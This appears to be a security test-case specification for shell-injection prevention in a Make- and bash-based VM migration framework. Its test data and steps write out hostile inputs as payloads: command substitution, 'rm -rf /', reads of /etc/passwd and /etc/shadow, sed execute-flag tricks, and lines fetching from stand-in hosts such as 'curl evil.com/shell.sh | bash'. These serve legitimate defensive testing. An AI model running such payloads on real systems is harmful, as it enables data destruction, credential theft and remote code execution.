# TC-SEC-003: Shell Injection via Inputs

## Test ID
TC-SEC-003

## Test Name
Shell Injection Prevention in User-Controlled Inputs

## Feature
Security — Input sanitization for VM names, namespaces, label selectors, SSH commands, and sed substitution values.

## Objective
Verify that user-controlled inputs (VM names, namespaces, label selectors, command arguments) cannot be exploited for shell injection via command substitution, backtick execution, semicolons, pipes, or sed special characters. Validate that the framework safely handles malicious input without executing unintended commands.

## Preconditions
1. The project scripts are present and executable.
2. Source cluster kubeconfig exists (for kubectl interaction scenarios).
3. Test does not require actual malicious code to execute — verification is that injection attempts are safely handled (quoted, escaped, or rejected).

## Test Data
| Input | Injection Payload | Target |
|-------|-------------------|--------|
| VM name | `vm-$(whoami)` | Command substitution |
| VM name | `` vm-`id` `` | Backtick execution |
| VM name | `vm; rm -rf /` | Semicolon command chain |
| Namespace | `ns$(cat /etc/passwd)` | Namespace injection |
| Namespace | `ns\nmalicious` | Newline injection |
| Label selector | `key=val; curl attacker.com` | Selector injection |
| SSH command (run_on_vm) | `true; cat /etc/shadow` | Command chaining in VM |
| REPLACE_* value | `value/e s/.*//e` | sed code execution |
| VM_PASSWORD | `pass$(id)word` | Cloud-init injection |

## Steps

### Sub-case 3.1: VM Name with Command Substitution — $(cmd)

#### Step 1: Attempt migration dry-run with injected VM name
```bash
make migrate-dry-run 'VM=vm-$(whoami)'
```

#### Step 2: Observe behavior
- The literal string `vm-$(whoami)` should be treated as the VM name.
- The `whoami` command should NOT be executed.
- The rendered YAML should contain `name: vm-$(whoami)` literally (or the Make/sed processing should reject it).

#### Step 3: Check if command was executed
```bash
# If the rendered YAML contains the output of whoami (e.g., "vm-root"), injection succeeded
make migrate-dry-run 'VM=vm-$(whoami)' 2>/dev/null | grep "name:"
# Should show: name: vm-$(whoami)-migration-plan
# NOT: name: vm-root-migration-plan
```

#### Step 4: Test with backticks
```bash
make migrate-dry-run 'VM=vm-`id`'
# Should render literally, not execute 'id' command
```

---

### Sub-case 3.2: VM Name with Semicolons and Pipes

#### Step 1: Test semicollon injection
```bash
make migrate-dry-run 'VM=vm-svc-0; rm -rf /tmp/test'
```

#### Step 2: Observe behavior
- Make may fail to parse the semicollon correctly (treated as shell separator in Make recipe).
- If it reaches the script, `set -euo pipefail` with proper quoting should prevent execution.
- The `rm -rf` command should NOT execute.

#### Step 3: Verify no side effects
```bash
touch /tmp/test-injection-marker
make migrate-dry-run 'VM=vm; rm /tmp/test-injection-marker' 2>/dev/null || true
ls /tmp/test-injection-marker  # File should still exist
rm /tmp/test-injection-marker
```

#### Step 4: Test pipe injection
```bash
make migrate-dry-run 'VM=vm|cat /etc/passwd'
# Should fail or treat the entire string as VM name
```

---

### Sub-case 3.3: Namespace with Injection Attempts

#### Step 1: Test command substitution in namespace
```bash
make migrate-dry-run VM=vm-svc-0 'NAMESPACE=ns-$(whoami)'
```

#### Step 2: Verify in rendered output
```bash
make migrate-dry-run VM=vm-svc-0 'NAMESPACE=ns-$(whoami)' 2>/dev/null | grep "targetNamespace"
# Should show: targetNamespace: ns-$(whoami)
# NOT: targetNamespace: ns-root
```

#### Step 3: Test newline injection
```bash
make migrate-dry-run VM=vm-svc-0 $'NAMESPACE=ns\nmalicious: injected'
# The newline should either be rejected or treated as literal characters
```

---

### Sub-case 3.4: Label Selector with Injection

#### Step 1: Test injection in selector
```bash
make discover-vms 'VM_LABEL_SELECTOR=workload-type=services-test; curl attacker.com'
```

#### Step 2: Observe behavior
- kubectl should receive the entire string as the label selector value.
- kubectl will reject it as an invalid label selector (parsing error).
- `curl attacker.com` should NOT be executed.

#### Step 3: Verify no network call
```bash
# Set up a marker — if curl executed, it would fail but leave evidence
make discover-vms 'VM_LABEL_SELECTOR=key=val$(touch /tmp/selector-injection)' 2>/dev/null || true
ls /tmp/selector-injection 2>/dev/null  # Should not exist
```

---

### Sub-case 3.5: SSH Command Injection via run_on_vm

#### Step 1: Analyze run_on_vm implementation
```bash
# In scripts/lib/ssh.sh, run_on_vm() passes $1 directly to --command
# The --command argument is a single string executed inside the VM
# This is by design — the VM is a sandboxed environment
```

#### Step 2: Verify command is contained within VM
```bash
# Even if a malicious command runs INSIDE the VM, it cannot affect the host
# The security boundary is the VM itself, enforced by KubeVirt/QEMU
# run_on_vm("true; cat /etc/shadow") executes inside the VM, not on the host
```

#### Step 3: Test that --command quoting prevents host-side injection
```bash
# The risk would be if the command argument broke out of virtctl ssh invocation
# Verify that special characters in the command don't escape to host shell
grep "command" scripts/lib/ssh.sh | head -5
# Should use: --command "$1" (double-quoted, single argument to virtctl)
```

---

### Sub-case 3.6: sed Substitution Injection in REPLACE_* Values

#### Step 1: Analyze the sed command in render() function
```bash
# In scripts/migrate-vm.sh, render() uses:
#   sed -e "s|REPLACE_VM_NAME|${VM_NAME}|g"
# The | delimiter means VM_NAME containing | would break substitution
```

#### Step 2: Test VM name with sed metacharacters
```bash
make migrate-dry-run 'VM=vm|svc|0'
# If VM_NAME contains |, the sed command becomes:
#   sed -e "s|REPLACE_VM_NAME|vm|svc|0|g"  ← BROKEN
# Expected: error from sed or incorrect output
```

#### Step 3: Test with sed execute flag injection
```bash
# In GNU sed, the 'e' flag executes the pattern space as a command
# Test if the framework is vulnerable:
make migrate-dry-run 'VM=vm/e' 2>/dev/null
# With | delimiter, / in the VM name is safe
# But s|REPLACE|vm/e|g would NOT trigger execution because | is the delimiter
```

#### Step 4: Test with backslash sequences
```bash
make migrate-dry-run 'VM=vm\nsvc' 2>/dev/null | grep "name:"
# Verify \n is treated literally, not as newline
```

---

### Sub-case 3.7: STORAGE_CLASS with sed Metacharacters

#### Step 1: Test render-config with pipe in STORAGE_CLASS
```bash
make render-config 'STORAGE_CLASS=standard|csi'
# sed command: sed -e 's|REPLACE_STORAGE_CLASS|standard|csi|g'
# This would break because | is the sed delimiter
```

#### Step 2: Verify the breakage or safe handling
```bash
cat kube-burner/.rendered-vm-services.yml | grep "storageClassName"
# If sed broke, the storageClassName value will be wrong or the command failed
```

## Expected Result
| Sub-case | Expected Behavior |
|----------|-------------------|
| 3.1 — $(cmd) | Literal string used or rejected; command NOT executed |
| 3.2 — Semicolons/pipes | No host command execution; script errors gracefully |
| 3.3 — Namespace injection | Literal value or rejection; no command execution |
| 3.4 — Selector injection | kubectl rejects invalid selector; no command execution |
| 3.5 — SSH run_on_vm | Commands execute inside VM sandbox only (by design) |
| 3.6 — sed injection | sed may error on metacharacters; no host code execution |
| 3.7 — STORAGE_CLASS | sed delimiter collision may break rendering (known limitation) |

## Validation Points
- [ ] `$(...)` in VM names is NOT executed on the host.
- [ ] Backticks in VM names are NOT interpreted.
- [ ] Semicolons in inputs do NOT chain additional commands.
- [ ] Pipe characters in inputs do NOT create shell pipelines.
- [ ] Newlines in inputs do NOT inject additional YAML lines or commands.
- [ ] `run_on_vm()` properly quotes the `--command` argument to virtctl.
- [ ] sed `|` delimiter makes `/` safe but `|` in values is a known limitation.
- [ ] No injection payload causes file creation, deletion, or network access on the host.
- [ ] Make's shell recipe handling properly quotes variables passed to scripts.
- [ ] `set -euo pipefail` in scripts causes early termination on malformed input rather than partial execution.

## Acceptance Criteria
1. No user-controlled input can cause arbitrary command execution on the host machine.
2. Malicious VM names, namespaces, or selectors either produce an error or are treated literally.
3. The sed delimiter choice (`|`) is documented as making `/` safe but `|` in values unsafe.
4. VM-internal command injection is acceptable (the VM is the security boundary).
5. All injection attempts are detectable by non-zero exit codes or error messages.

## Edge Cases Covered
- VM name `$(reboot)`: Should not reboot the host.
- Namespace `; DROP TABLE users;--`: SQL injection style (irrelevant but tests general quoting).
- Label selector with URL: `key=val; curl evil.com/shell.sh | bash`.
- REPLACE_* value containing all sed special characters: `&`, `\1`, `\n`.
- Password containing `$`: VM_PASSWORD=`pass$word` — variable expansion risk.

## Failure Scenarios
| Failure | Root Cause | Impact |
|---------|-----------|--------|
| Command execution via $(cmd) | Unquoted variable expansion in Make recipe | Arbitrary host command execution |
| sed delimiter collision | VM name or value contains `\|` | Broken YAML rendering, potential sed injection |
| Newline YAML injection | Unescaped newlines in sed replacement | Malformed YAML with injected fields |
| SSH command breakout | Unquoted --command argument | Host-side command execution (severe) |
| printf format string attack | User input passed to printf without %s | Format string vulnerability |

## Automation Potential
**High**. All injection tests are automatable:
- Create marker files before injection attempts, verify they survive after.
- Capture exit codes and output, verify no unintended execution evidence.
- No cluster access needed for most tests (dry-run mode).
- Can be parallelized across sub-cases.
- Estimated effort: 3–4 hours.

## Priority
**P1 — High**

## Severity
**S1 — Critical**

Shell injection could allow arbitrary command execution on the operator's machine or on cluster nodes. Even in test environments, this represents a significant security risk especially when inputs come from CI variables or external configuration.
